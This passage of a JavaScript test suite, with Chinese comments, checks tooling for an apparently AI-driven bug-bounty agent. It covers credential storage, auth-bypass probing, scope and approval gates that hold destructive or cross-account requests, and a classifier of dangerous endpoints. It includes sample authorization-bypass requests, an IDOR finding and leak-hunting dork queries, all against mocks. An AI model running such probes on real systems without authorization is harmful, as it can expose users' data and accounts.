  assert.notEqual(a2.credentialRef, a.credentialRef);
  // 已有引用可免重复粘贴：credentialRef 直接登记新 label
  const b = await h.run("src_add_test_account", { label: "管理员号B", credentialRef: a2.credentialRef }, parent);
  assert.equal(b.updated, false);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.testAccounts.length, 2);
  assert.equal(state.counts.testAccounts, 2);
  assert.equal(state.testAccounts.some((r) => r.label === "管理员号B"), true);
  // credential 不暴露进投影（只暴露 label/note/observationId/credentialRef）
  assert.equal(state.testAccounts.every((r) => !("credential" in r)), true);
  // 凭证库文件按指纹落盘（vault 目录为全测试进程共享，只验证本测试的两条引用各自成文件）
  const { readdirSync } = await import("node:fs");
  const vaultFiles = new Set(readdirSync(credentialVaultDir(process.env.DSH_HOME)).filter((f) => f.endsWith(".json")));
  assert.equal(vaultFiles.has(a.credentialRef.replace("credential://", "") + ".json"), true);
  assert.equal(vaultFiles.has(a2.credentialRef.replace("credential://", "") + ".json"), true);
  // 向后兼容：infra.testAccount 单值也进列表（label=legacy-infra）
  await h.run("src_set_infra", { key: "testAccount", value: "user:pass" }, parent);
  const state2 = await h.run("src_state", {}, parent);
  assert.equal(state2.testAccounts.some((r) => r.label === "legacy-infra"), true);
});

test("[local.23] 认证预算：src_test_bypass 计数 + budgetExhausted 软信号 + 401 连发 sessionLikelyExpired", async () => {
  const h = harness();
  const parent = h.exec("g23bud");
  await h.run("src_add_goal", { target: "https://example.test", objective: "预算", authorization: "t" }, parent);
  const intent = await h.run("src_add_intent", { title: "auth", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "auth bypass", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    // 认证请求（带 Cookie）连续 401 → sessionLikelyExpired
    globalThis.fetch = async () => new Response("unauth", { status: 401, headers: { "content-type": "application/json" } });
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "authorization-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/api/me", headers: { cookie: "sid=abc" } },
      variants: [{ method: "GET", path: "/api/admin", headers: { cookie: "sid=abc" } }, { method: "GET", path: "/api/orders/1", headers: { cookie: "sid=abc" } }]
    }, parent);
    assert.equal(result.sessionLikelyExpired, true, "401 连发应触发 sessionLikelyExpired");
    // authBudget 在 view 里可见
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.authBudget.limit, 30);
    assert.ok(state.authBudget.used >= 3, "认证请求应计数");
  } finally { globalThis.fetch = originalFetch; }
});

test("[local.24] 域笔记：登记/去重/跨会话积累 + src_add_goal priorContext briefing", async () => {
  const h = harness();
  // 会话 A：建目标 + 记域笔记 + 记已否 research + 记 finding
  const a = h.exec("s24a");
  await h.run("src_add_goal", { target: "cross-24.test", objective: "首轮", authorization: "t" }, a);
  const note = await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流 5rps", content: "burst 会 429，需降到 2rps 才稳。" }, a);
  assert.equal(note.updated, false);
  assert.match(note.id, /^domainNote-/);
  assert.equal(note.target, "cross-24.test");
  // 同目标+title 覆盖
  const note2 = await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流 5rps", content: "更正：实测 10rps 才 429。" }, a);
  assert.equal(note2.updated, true);
  assert.equal(note2.id, note.id);
  const intent = await h.run("src_add_intent", { title: "测 x", goalId: "goal-1" }, a);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "/admin 无鉴权可直访", status: "false-positive", stopReason: "/admin 有 302 跳登录，无直访" }, a);
  await h.run("src_add_finding", { title: "用户ID 可枚举他人订单 (IDOR)", severity: "high", intentId: intent.id, researchId: research.id, impact: "任意登录用户可读他人订单，收货人电话地址批量泄露可被用于精准诈骗与倒卖", affectedScope: "全部订单接口", remediation: "订单查询校验属主", victimImpact: "受害用户的订单收货人电话与地址被陌生人读取并可能遭诈骗骚扰且无从察觉", attackPrerequisites: "攻击者仅需注册普通账号登录后遍历订单 ID，无需任何管理权限", concreteLossEvidence: [research.id], reproducibleSteps: ["登录 A", "GET /api/orders/2"], pocEvidence: ["GET /api/orders/2 用 sid=A 的 cookie 返回他人订单"] }, a);
  // 列表
  const state = await h.run("src_state", {}, a);
  // 注：domain_notes 未进 view，但可通过新会话 src_add_goal 的 priorContext 验证

  // 会话 B：同目标开局 → priorContext 应含域笔记 + 已否假设 + findings
  const b = h.exec("s24b");
  const goal = await h.run("src_add_goal", { target: "cross-24.test", objective: "第二轮续测", authorization: "t" }, b);
  assert.ok(goal.priorContext, "同目标续测应返回 priorContext");
  assert.ok(Array.isArray(goal.priorContext.notes) && goal.priorContext.notes.length === 1, "应含1条域笔记");
  assert.equal(goal.priorContext.notes[0].title, "api/v1 限流 5rps");
  assert.ok(Array.isArray(goal.priorContext.falsifiedHypotheses) && goal.priorContext.falsifiedHypotheses.length === 1, "应含1条已否假设");
  assert.ok(goal.priorContext.falsifiedHypotheses[0].hypothesis.includes("/admin"), "已否假设应含 /admin 那条");
  assert.ok(Array.isArray(goal.priorContext.findings) && goal.priorContext.findings.length === 1, "应含1条已确认 finding");
  assert.equal(goal.priorContext.priorSessions, 1);

  // 不同目标开局 → 无 priorContext
  const c = h.exec("s24c");
  const goal2 = await h.run("src_add_goal", { target: "unrelated-24.test", objective: "无关目标" }, c);
  assert.equal(goal2.priorContext, undefined, "不同目标不应有 priorContext");
});

test("[local.24] 域笔记查看通道：src_list_domain_notes 只读清单 + src_state 投影", async () => {
  const h = harness();
  const a = h.exec("s24d");
  await h.run("src_add_goal", { target: "list-24.test", objective: "查看通道" }, a);
  // 未记笔记时：空清单
  const empty = await h.run("src_list_domain_notes", {}, a);
  assert.equal(empty.target, "list-24.test");
  assert.deepEqual(empty.notes, []);
  // 记两条不同 category
  await h.run("src_record_domain_note", { category: "fingerprint", title: "技术栈 Vue3+Spring", content: "前端 Vue3，后端 Spring Boot 2.x，/api/v2 前缀。" }, a);
  await h.run("src_record_domain_note", { category: "pitfall", title: "登录接口 5 次锁号", content: "连续 5 次错误密码锁 30 分钟。" }, a);
  // 只读清单：含两条，不含 content（精简投影）
  const listed = await h.run("src_list_domain_notes", {}, a);
  assert.equal(listed.notes.length, 2);
  assert.ok(listed.notes.every((n) => !("content" in n)), "清单不应含 content");
  assert.ok(listed.notes.some((n) => n.category === "fingerprint" && n.title === "技术栈 Vue3+Spring"));
  // src_state 投影：domainNotes 数组 + counts
  const state = await h.run("src_state", {}, a);
  assert.equal(state.domainNotes.length, 2);
  assert.equal(state.counts.domainNotes, 2);
  assert.ok(state.domainNotes.every((n) => !("content" in n)), "投影不应含 content");
  // 另一会话同目标：src_state 也能看到（跨会话共享）
  const b = h.exec("s24e");
  await h.run("src_add_goal", { target: "list-24.test", objective: "续测视角" }, b);
  const stateB = await h.run("src_state", {}, b);
  assert.equal(stateB.counts.domainNotes, 2, "跨会话应共享笔记");
  // 未初始化会话：空投影不报错
  const c = h.exec("s24f");
  const stateC = await h.run("src_state", {}, c);
  assert.deepEqual(stateC.domainNotes, []);
  assert.equal(stateC.counts.domainNotes, 0);
  // 无 goal 会话直接调 list：应报错（requires goal）
  await assert.rejects(() => h.run("src_list_domain_notes", {}, c), /src_add_goal/);
});

/* [local.26] 模块一-路线A：高危动作分类纯函数（不触网，不需 mock 服务器）。 */
test("[local.26] classifyHttpRequest 拦截红线：closeAccount GET+token+他人 id → 破坏性写入挂", () => {
  const v = classifyHttpRequest({ method: "GET", path: "/api-c/user/v1/closeAccount", headers: { userId: "15", authorization: "Bearer t" } });
  assert.equal(v.require, true, "closeAccount 必须挂起（真实美团红线复现）");
  assert.equal(v.category, "破坏性写入");
});
test("[local.26] classifyHttpRequest 越权：有 token + 写方法 + 他人资源 id → 越权删改挂", () => {
  const v = classifyHttpRequest({ method: "POST", path: "/api/v1/orders", headers: { authorization: "Bearer t" }, body: '{"userId":42}' });
  assert.equal(v.require, true);
  assert.equal(v.category, "越权删改");
  assert.deepEqual(v.victimIds, [42]);
});
test("[local.26] classifyHttpRequest 未授权删改：无 token + 写方法 + 非读语义 path → 挂", () => {
  const v = classifyHttpRequest({ method: "POST", path: "/api/v1/user/register", headers: {}, body: '{"phone":"123"}' });
  assert.equal(v.require, true);
  assert.equal(v.category, "未授权删改");
});
test("[local.26] classifyHttpRequest 放行：自己 token + 自己资源 id 的小写写不误报越权仍挂（代价可接受）", () => {
  /* 自己资源也可能命中"他人 id"枚举；为删改零漏，写+token+枚举 id 一律挂，批准即可执行。 */
  const v = classifyHttpRequest({ method: "POST", path: "/api/v1/profile", headers: { authorization: "Bearer t" }, body: '{"userId":1}' });
  assert.equal(v.require, true);
  assert.equal(v.category, "越权删改");
});
test("[local.26] classifyHttpRequest 放行：强读语义 path + 未授权探测 → 放行（白名单）", () => {
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/users/query?userId=3", headers: {} }).require, false);
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/orders/list", headers: {} }).require, false);
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/account/detail", headers: {} }).require, false);
});
test("[local.26] classifyHttpRequest 不误伤：preset 不命中 reset、enclose 不命中 close", () => {
  /* preset/config 是读 → 放行；enclose 是 POST+无 token+非读语义 → 未授权删改挂（不含破坏性词） */
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/preset/config", headers: {} }).require, false);
  const enclose = classifyHttpRequest({ method: "POST", path: "/api/v1/enclose", headers: {} });
  assert.equal(enclose.require, true);
  assert.equal(enclose.category, "未授权删改");
});
test("[local.26] classifyHttpRequest 破坏性词作为 GET 也挂：cancelOrder/deleteUser", () => {
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/orders/cancelOrder", headers: { authorization: "t" } }).category, "破坏性写入");
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/deleteUser", headers: { authorization: "t" } }).category, "破坏性写入");
});
test("[local.26] classifyHttpRequest SMS 发包（软约束）：GET + 无 token + 读语义放行（设计可接受）", () => {
  /* sentVerificationCode 是 GET+副作用词但无破坏性词、非写方法 → 放行；发包拦截是软约束。 */
  const v = classifyHttpRequest({ method: "GET", path: "/api/v1/sms/sentVerificationCode?regionCode=JP&phoneNumber=9012345670", headers: {} });
  assert.equal(v.require, false);
});

/* [local.26] 模块一-路线A：src_http 工具集成——本地 mock HTTP 服务器（127.0.0.1，非厂商域名）。
 * 验证：放行请求直接转发；破坏性/越权/未授权删改请求挂起审批，批准后才转发，拒绝/无人审 fail-closed。 */
test("[local.26] src_http 放行读请求直接转发到本地 mock 服务器", async () => {
  const server = http.createServer((req, res) => { res.writeHead(200, { "content-type": "text/plain" }); res.end("ok-" + req.url); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const targetHost = "127.0.0.1";
  const h = harnessWithApproval({ policy: "allow" });
  const parent = h.exec("http1");
  await h.run("src_add_goal", { target: targetHost, objective: "mock 验证 src_http 放行" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://${targetHost}:${port}/api/v1/users/list`, method: "GET", justification: "读名单无破坏性" }, parent);
    assert.equal(result.approval, "allowed-auto");
    assert.equal(result.status, 200);
  } finally { server.close(); }
});
test("[local.26/31] src_http 破坏性请求挂起待审——拒绝则不发出（mock 收不到请求）", async () => {
  let hitCount = 0;
  const server = http.createServer((req, res) => { hitCount++; res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("http2");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证破坏性待审拒绝" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { userId: "15", authorization: "Bearer t" }, justification: "删除 userId=15" }, parent);
    assert.equal(result.approval, "pending", "挂起待审不发出");
    assert.equal(result.status, 0, "挂起不应发出，status 为 0");
    assert.ok(/^approval-\d+$/.test(result.pendingApprovalId), "返回 pendingApprovalId");
    assert.equal(hitCount, 0, "mock 服务器不应收到任何请求");
    /* 用户在面板点拒绝 → agent 调 src_resolve_approval reject：仍不发出。 */
    const rejected = await h.run("src_resolve_approval", { id: result.pendingApprovalId, action: "reject", note: "可能误伤真实用户" }, parent);
    assert.equal(rejected.status, "rejected");
    assert.equal(rejected.responseStatus, 0, "拒绝不发出，responseStatus 为 0");
    assert.equal(hitCount, 0, "拒绝后 mock 仍不应收到请求");
  } finally { server.close(); }
});
test("[local.26/31] src_http 越权删改挂起——批准后才转发（mock 收到一次）", async () => {
  let hitCount = 0;
  const server = http.createServer((req, res) => { hitCount++; res.writeHead(201); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("http3");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证越权待审批准" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://127.0.0.1:${port}/api/v1/orders`, method: "POST", headers: { authorization: "Bearer t" }, body: '{"userId":42}', justification: "越权改他人订单（待审）" }, parent);
    assert.equal(result.approval, "pending", "挂起待审");
    assert.equal(hitCount, 0, "挂起阶段 mock 不应收到请求");
    /* 用户点批准 → agent 调 src_resolve_approval allow：发出原请求，mock 收到一次。 */
    const approved = await h.run("src_resolve_approval", { id: result.pendingApprovalId, action: "allow", note: "可信测试账号" }, parent);
    assert.equal(approved.status, "approved");
    assert.equal(approved.responseStatus, 201, "发出后返回 mock 响应码");
    assert.equal(hitCount, 1, "批准后 mock 收到一次");
  } finally { server.close(); }
});
test("[local.26/31] src_http 无审批服务仍能挂起为 pending（异步队列不依赖 ctx.approval）", async () => {
  const server = http.createServer((_req, res) => { res.writeHead(200); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness(); /* 无 approval 服务——异步队列不依赖它 */
  const parent = h.exec("http4");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证无审批服务仍可挂起" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { userId: "1", authorization: "Bearer t" }, justification: "删改" }, parent);
    assert.equal(result.approval, "pending", "无审批服务也挂起为 pending（不抛错）");
    assert.ok(/^approval-\d+$/.test(result.pendingApprovalId));
  } finally { server.close(); }
});
test("[local.54] src_http credentialRef：放行请求注入认证头 + 挂起待审脱敏存储 + 批准重放凭据重注入", async () => {
  const seen = [];
  const server = http.createServer((req, res) => { seen.push({ url: req.url, cookie: req.headers.cookie ?? "", authorization: req.headers.authorization ?? "", userId: req.headers["x-user-id"] ?? "" }); res.writeHead(200, { "content-type": "application/json" }); res.end("{}"); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("http54");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证 credentialRef 全链路" }, parent);
  try {
    /* ① 登记测试账号 → 凭据入库，只拿 credentialRef。 */
    const acct = await h.run("src_add_test_account", { label: "用户A", credential: "Cookie: sid=hunter-token-abc; role=user", note: "对照号" }, parent);
    assert.match(acct.credentialRef, /^credential:\/\/[a-f0-9]{64}$/);
    /* ② 放行分支：credentialRef 注入 Cookie 头（headers 只传非敏感头）。 */
    const ok = await h.run("src_http", { url: `http://127.0.0.1:${port}/api/v1/orders/list`, method: "GET", headers: { "x-user-id": "7" }, credentialRef: acct.credentialRef, justification: "读订单无破坏性" }, parent);
    assert.equal(ok.approval, "allowed-auto");
    assert.equal(ok.status, 200);
    assert.equal(seen[0].cookie, "sid=hunter-token-abc; role=user", "凭据库 Cookie 已注入");
    assert.equal(seen[0]["x-user-id"] || seen[0].userId, "7", "非敏感头透传");
    /* ③ 挂起分支：credentialRef 请求挂起，待审行 headers 脱敏（无明文 Cookie），credentialRef 落库。 */
    const pending = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { "x-user-id": "15" }, credentialRef: acct.credentialRef, justification: "删改待审：验证脱敏与重放" }, parent);
    assert.equal(pending.approval, "pending");
    const state = await h.run("src_state", {}, parent);
    const row = state.pendingApprovals.find((r) => r.id === pending.pendingApprovalId);
    assert.ok(row, "待审行进投影");
    assert.doesNotMatch(row.headers, /hunter-token-abc/, "待审行 headers 不含明文凭据");
    assert.doesNotMatch(JSON.stringify(row), /hunter-token-abc/, "待审行整体不含明文凭据");
    assert.match(row.credentialRef, /^credential:\/\//, "待审行存 credentialRef");
    /* ④ 批准重放：凭据从凭证库重注入，mock 收到完整 Cookie。 */
    const approved = await h.run("src_resolve_approval", { id: pending.pendingApprovalId, action: "allow", note: "可信测试号" }, parent);
    assert.equal(approved.status, "approved");
    assert.equal(approved.responseStatus, 200);
    assert.equal(seen[1].cookie, "sid=hunter-token-abc; role=user", "重放时凭据重注入");
    assert.equal(seen.length, 2, "只发了两次请求");
    /* ⑤ 旧习惯直粘认证头：挂起时自动入库脱敏，重放仍能恢复。 */
    const legacy = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { userId: "3", authorization: "Bearer legacy-raw-token" }, justification: "旧式内联认证头自动入库" }, parent);
    assert.equal(legacy.approval, "pending");
    const state2 = await h.run("src_state", {}, parent);
    const row2 = state2.pendingApprovals.find((r) => r.id === legacy.pendingApprovalId);
    assert.doesNotMatch(JSON.stringify(row2), /legacy-raw-token/, "内联认证头自动入库后待审行无明文");
    assert.match(row2.credentialRef, /^credential:\/\//, "内联认证头自动转 credentialRef");
    const approved2 = await h.run("src_resolve_approval", { id: legacy.pendingApprovalId, action: "allow" }, parent);
    assert.equal(approved2.responseStatus, 200);
    assert.equal(seen[2].authorization, "Bearer legacy-raw-token", "内联凭据重放恢复");
  } finally { server.close(); }
});
test("[local.26] src_http 目标越界（非授权 host）抛错", async () => {
  const h = harnessWithApproval({ policy: "allow" });
  const parent = h.exec("http5");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证越界" }, parent);
  await assert.rejects(() => h.run("src_http", { url: "http://example.test/evil", method: "GET", justification: "越界" }, parent), /outside the authorized goal host/);
});

test("[local.43] 资产清单即许可：src_add_asset 登记后探测放行（含子域/URL 形态值），excluded 不放行", async () => {
  const h = harnessWithApproval({ policy: "allow" });
  const parent = h.exec("http6");
  await h.run("src_add_goal", { target: "xiaomi.test", objective: "资产授权验证" }, parent);
  /* 未登记：goal 主域外的 host 仍拒绝，报错带资产清单指引 */
  await assert.rejects(() => h.run("src_http", { url: "http://ai.mi.test/x", method: "GET", justification: "未登记" }, parent), /outside the authorized goal host and not in the asset inventory/);
  /* 登记资产（candidate 默认）→ 精确 host 过授权闸（后续报网络错误而非越界） */
  const a1 = await h.run("src_add_asset", { type: "subdomain", value: "ai.mi.test", source: "CT 日志发现" }, parent);
  assert.match(a1.id, /^asset-\d+$/);
  const notGate = (e) => { assert.ok(!/outside the authorized goal host/.test(e.message), `应过授权闸，实际: ${e.message}`); return true; };
  await assert.rejects(() => h.run("src_http", { url: "http://ai.mi.test/x", method: "GET", justification: "已登记" }, parent), notGate);
  /* 资产子域同样覆盖 */
  await assert.rejects(() => h.run("src_http", { url: "http://preview.ai.mi.test/x", method: "GET", justification: "子域" }, parent), notGate);
  /* URL 形态值 + 描述尾巴的派生 */
  await h.run("src_add_asset", { type: "endpoint", value: "https://open.api.test/ (HTTP/2 200, MIFE)", source: "JS 提取" }, parent);
  await assert.rejects(() => h.run("src_http", { url: "http://open.api.test/x", method: "GET", justification: "URL 形态登记" }, parent), notGate);
  /* excluded 资产不作为授权依据 */
  await h.run("src_add_asset", { type: "subdomain", value: "parked.test", source: "通配符解析误报", status: "excluded" }, parent);
  await assert.rejects(() => h.run("src_http", { url: "http://parked.test/x", method: "GET", justification: "已排除" }, parent), /outside the authorized goal host/);
});

test("[local.43] src_state 输出 assetScope（schema 同步）+ 资产大小写不敏感合并升状态 + dorks 双向覆盖 + lossless", async () => {
  const h = harness();
  const parent = h.exec("g43a");
  await h.run("src_add_goal", { target: "xiaomi.test", objective: "assetScope 验证" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await h.run("src_add_asset", { type: "subdomain", value: "miui.test", source: "CT 日志" }, parent);
  const dup = await h.run("src_add_asset", { type: "subdomain", value: "MIUI.TEST", source: "DNS 确认", status: "confirmed" }, parent);
  assert.equal(dup.duplicate, true, "大小写不敏感去重合并");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.assetScope.model, "asset-inventory");
  assert.ok(state.assetScope.grantableHosts >= 1, "至少 1 个可测 host");
  assert.ok(state.assetScope.topDomains.some((t) => t.host === "miui.test"));
  assert.deepEqual(collectUndefinedKeys(state.assetScope), [], "assetScope 零 undefined 键");
  /* collect_dorks 双向覆盖：资产 host 在 domain 下 → domain 放行（过闸后正常生成查询） */
  await h.run("src_add_asset", { type: "subdomain", value: "sub.dorks.test", source: "DNS" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response('<a class="result__a" href="https://github.com/x/y/blob/main/.env">github.com/x/y .env leak</a>', { status: 200, headers: { "content-type": "text/html" } });
    const dorks = await h.run("src_collect_dorks", { intentId: "intent-1", domain: "dorks.test" }, parent);
    assert.ok(dorks.queries >= 15, "domain 被资产双向覆盖，过闸成功");
  } finally { globalThis.fetch = originalFetch; }
});

/* [local.44] 资产归属人工确认：提交→去重→三档跳过；/src-approve 直写落库；工具自批封死；byStatus+finalize 软警告。 */
test("[local.44] src_request_asset_confirm：挂队待审 + 同域去重 + goal 内/已覆盖/已否决跳过 + lossless", async () => {
  const h = harness();
  const parent = h.exec("g44a");
  await h.run("src_add_goal", { target: "xiaomi.test", objective: "归属确认验证" }, parent);
  /* 正常提交：返回 pendingApprovalId，status pending */
  const p1 = await h.run("src_request_asset_confirm", { domain: "sfgy1.com", evidence: "品牌相似+证书 CN 命中" }, parent);
  assert.equal(p1.status, "pending");
  assert.match(p1.pendingApprovalId, /^approval-\d+$/);
  assert.equal(p1.duplicate, false);
  assert.deepEqual(collectUndefinedKeys(p1), [], "零 undefined 键");
  /* 同域重复提交（带 *. 前缀）：归一化后去重复用 */
  const p2 = await h.run("src_request_asset_confirm", { domain: "*.sfgy1.com", evidence: "再次发现" }, parent);
  assert.equal(p2.duplicate, true);
  assert.equal(p2.pendingApprovalId, p1.pendingApprovalId, "*. 前缀归一化后同域去重");
  /* 挂队行进投影，method=ASSET，category=asset-attribution */
  const state1 = await h.run("src_state", {}, parent);
  const row = (state1.pendingApprovals ?? []).find((r) => r.id === p1.pendingApprovalId);
  assert.ok(row !== void 0, "待审行进投影");
  assert.equal(row.method, "ASSET");
  assert.equal(row.category, "asset-attribution");
  assert.equal(row.status, "pending");
  /* goal 主域内：跳过不挂队 */
  const s1 = await h.run("src_request_asset_confirm", { domain: "shop.xiaomi.test", evidence: "主域内" }, parent);
  assert.equal(s1.status, "skipped");
  /* 已被资产覆盖：跳过 */
  await h.run("src_add_asset", { type: "subdomain", value: "brand.test", source: "官网导航" }, parent);
  const s2 = await h.run("src_request_asset_confirm", { domain: "brand.test", evidence: "已登记" }, parent);
  assert.equal(s2.status, "skipped");
  /* 已否决（excluded 覆盖）：跳过并提示翻案路径 */
  await h.run("src_add_asset", { type: "subdomain", value: "parked.test", source: "误报", status: "excluded" }, parent);
  const s3 = await h.run("src_request_asset_confirm", { domain: "parked.test", evidence: "翻案" }, parent);
  assert.equal(s3.status, "skipped");
  assert.match(s3.message, /否决/);
  /* 非法域名（单标签/带路径）：拒绝 */
  await assert.rejects(() => h.run("src_request_asset_confirm", { domain: "localhost", evidence: "x" }, parent), /不是合法域名/);
  await assert.rejects(() => h.run("src_request_asset_confirm", { domain: "a.test/path", evidence: "x" }, parent), /不是合法域名/);
  /* 无 goal 会话：拒绝 */
  const other = h.exec("g44b");
  await assert.rejects(() => h.run("src_request_asset_confirm", { domain: "sfgy1.com", evidence: "x" }, other), /requires an initialized SRC goal/);
});

test("[local.44] ASSET 待审：/src-approve 直写落库（allow→confirmed 闸放行 / reject→excluded），src_resolve_approval 工具禁自批", async () => {
  const h = harnessWithApproval({ policy: "allow" });
  const parent = h.exec("g44c");
  await h.run("src_add_goal", { target: "xiaomi.test", objective: "确认落库" }, parent);
  const p1 = await h.run("src_request_asset_confirm", { domain: "partner.test", evidence: "业务关联" }, parent);
  /* agent 自批被拒：工具层闸 */
  await assert.rejects(() => h.run("src_resolve_approval", { id: p1.pendingApprovalId, action: "allow" }, parent), /只能由用户/);
  /* 用户在面板/命令行确认：/src-approve <id> allow —— 直接落库 confirmed 资产 + followup + 合成事件 */
  const cmd = h.commands.get("src-approve");
  assert.ok(cmd !== void 0, "src-approve 命令已注册");
  const followups = [];
  const reply = await cmd.handler({ rawInput: `${p1.pendingApprovalId} allow 是合作方域`, agent: { session: parent.agent.session, followup: async (m) => { followups.push(m); } } });
  assert.equal(reply.kind, "success");
  assert.match(reply.text, /已确认/);
  assert.equal(followups.length, 1);
  assert.match(JSON.stringify(followups[0]), /用户确认 partner.test/, "followup 告知 agent 重试");
  /* 资产落库：confirmed + user-confirmed + source 带命令 id */
  const state = await h.run("src_state", {}, parent);
  const asset = (state.assets ?? []).find((a) => a.value === "partner.test");
  assert.ok(asset !== void 0, "整域资产已登记");
  assert.equal(asset.status, "confirmed");
  assert.equal(asset.method, "user-confirmed");
  assert.match(asset.source, new RegExp(p1.pendingApprovalId));
  /* 待审行置 approved；合成事件已追加 */
  const resolved = (state.pendingApprovals ?? []).find((r) => r.id === p1.pendingApprovalId);
  assert.equal(resolved.status, "approved");
  /* 合成事件已追加（fold 与时间线可见） */
  const sessEvents = h.sessions.get("g44c").events;
  assert.ok(sessEvents.some((e) => e.type === "tool/call" && e.data.name === "src_resolve_approval" && String(e.data.arguments ?? "").includes(p1.pendingApprovalId)), "src_resolve_approval 合成事件已落");
  /* 闸放行：整域子域过授权闸（后续报网络错误而非越界） */
  const notGate = (e) => { assert.ok(!/outside the authorized goal host/.test(e.message), `应过授权闸，实际: ${e.message}`); return true; };
  await assert.rejects(() => h.run("src_http", { url: "http://api.partner.test/x", method: "GET", justification: "用户确认归属" }, parent), notGate);
  /* 幂等：同 id 重复处理 → error */
  const again = await cmd.handler({ rawInput: `${p1.pendingApprovalId} reject 不`, agent: { session: parent.agent.session, followup: async () => {} } });
  assert.equal(again.kind, "error");
  assert.match(again.text, /已处理过/);
  /* reject 路径：file 新确认 → 否决 → excluded 资产 → 闸仍拒 + followup 告知放弃 */
  const p2 = await h.run("src_request_asset_confirm", { domain: "other.test", evidence: "疑似" }, parent);
  const followups2 = [];
  const reply2 = await cmd.handler({ rawInput: `${p2.pendingApprovalId} reject 不是我们的`, agent: { session: parent.agent.session, followup: async (m) => { followups2.push(m); } } });
  assert.equal(reply2.kind, "success");
  assert.match(JSON.stringify(followups2[0]), /否决 other.test/);
  const synth2 = h.sessions.get("g44c").events.some((e) => e.type === "tool/call" && String(e.data.arguments ?? "").includes(p2.pendingApprovalId));
  assert.ok(synth2, "reject 合成事件已落");
  const state2 = await h.run("src_state", {}, parent);
  const excludedAsset = (state2.assets ?? []).find((a) => a.value === "other.test");
  assert.equal(excludedAsset?.status, "excluded");
  await assert.rejects(() => h.run("src_http", { url: "http://www.other.test/x", method: "GET", justification: "应仍拒绝" }, parent), /outside the authorized goal host/);
});

test("[local.44] assetScope.byStatus 状态分布 + finalize 未决归属确认软警告", async () => {
  const h = harness();
  const parent = h.exec("g44d");
  await h.run("src_add_goal", { target: "xiaomi.test", objective: "byStatus 验证" }, parent);
  await h.run("src_add_asset", { type: "subdomain", value: "a.test", source: "x", status: "candidate" }, parent);
  await h.run("src_add_asset", { type: "subdomain", value: "b.test", source: "x", status: "confirmed" }, parent);
  await h.run("src_add_asset", { type: "subdomain", value: "c.test", source: "x", status: "excluded" }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.deepEqual(state.assetScope.byStatus, { candidate: 1, confirmed: 1, excluded: 1 }, "byStatus 状态分布");
  assert.deepEqual(collectUndefinedKeys(state.assetScope), [], "assetScope 仍零 undefined 键");
  /* finalize：未决 ASSET 待审 → 软警告提示报告写覆盖限制 */
  await h.run("src_request_asset_confirm", { domain: "maybe.test", evidence: "e" }, parent);
  const BLIND = [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }];
  const fin = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  assert.match(fin.warnings.join(" "), /资产归属确认仍待用户处理/, "未决归属确认应警告");
  assert.match(fin.warnings.join(" "), /maybe.test/);
  /* 用户处理后警告消失 */
  const pendingRow = (await h.run("src_state", {}, parent)).pendingApprovals.find((r) => r.method === "ASSET" && r.status === "pending");
  const cmd = h.commands.get("src-approve");
  await cmd.handler({ rawInput: `${pendingRow.id} allow 确认`, agent: { session: parent.agent.session, followup: async () => {} } });
  const fin2 = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  assert.doesNotMatch(fin2.warnings.join(" "), /资产归属确认仍待用户处理/, "处理后不再警告");
});

/* [local.45] domain 打开失败自愈：legacy 脏记录卡开 → 修数据后重试应恢复，不再永久重放 rejected promise。 */
test("[local.45] domain() 打开失败后自愈：清实例级 rejected promise，下次调用重新 open（不永久卡死）", async () => {
